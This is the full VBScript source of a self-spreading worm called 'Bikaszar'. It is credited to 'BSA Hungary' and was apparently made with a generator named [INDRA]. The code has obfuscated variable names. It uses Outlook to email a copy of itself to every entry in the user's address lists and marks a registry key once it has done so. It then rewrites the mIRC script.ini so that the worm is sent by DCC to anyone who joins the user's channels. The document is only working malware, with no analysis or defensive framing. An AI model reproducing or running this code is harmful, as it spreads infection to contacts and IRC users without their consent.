'Worm Name: Bikaszar
'Written By: BSA Hungary
'[INDRA]
On Error Resume Next
nirqaroohsmilbf = WScript.ScriptFullName
Set kywwpsliwgiwbyy = CreateObject("WScript.Shell") 
If kywwpsliwgiwbyy.RegRead("HKCU\Software\Bikaszar_sent") <> "yea" Then
Set qbvpwkhxwxwcjlb = CreateObject("Outlook.Application")
If qbvpwkhxwxwcjlb <> "" Then
Set giddvcgkhvhshit = qbvpwkhxwxwcjlb.GetNameSpace("MAPI")
For hfergknokxkcfok = 1 to giddvcgkhvhshit.AddressLists.Count
Set mawcfkpfilqgqfa = qbvpwkhxwxwcjlb.CreateItem(0)
Set hvnextoaaltjdqy = giddvcgkhvhshit.AddressLists.Item(hfergknokxkcfok)
mawcfkpfilqgqfa.Attachments.Add nirqaroohsmilbf
mawcfkpfilqgqfa.Subject = "BSA Hungary"
Set aekiovuvphlwgps = hvnextoaaltjdqy.AddressEntries
Set jgsieieknnoopkr = mawcfkpfilqgqfa.Recipients
For ygqmxicaqkdglle = 1 to aekiovuvphlwgps.Count
mawcfkpfilqgqfa.Recipients.Add aekiovuvphlwgps.Item(ygqmxicaqkdglle)
Next
mawcfkpfilqgqfa.Send
Next
kywwpsliwgiwbyy.RegWrite "HKCU\Software\Bikaszar_sent", "yea" 
End If
End If
Set ofkfwaudcfutgls = CreateObject("Scripting.FileSystemObject")
Set rgmtypjmdeqybte = ofkfwaudcfutgls.CreateTextFile("C:\mirc\script.ini", True)
rgmtypjmdeqybte.WriteLine "[script]"
rgmtypjmdeqybte.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
rgmtypjmdeqybte.Write "n1=/dcc           send         $nick """
rgmtypjmdeqybte.Write nirqaroohsmilbf
rgmtypjmdeqybte.WriteLine """ }"
rgmtypjmdeqybte.Close
'Generated with [INDRA] v0.2.
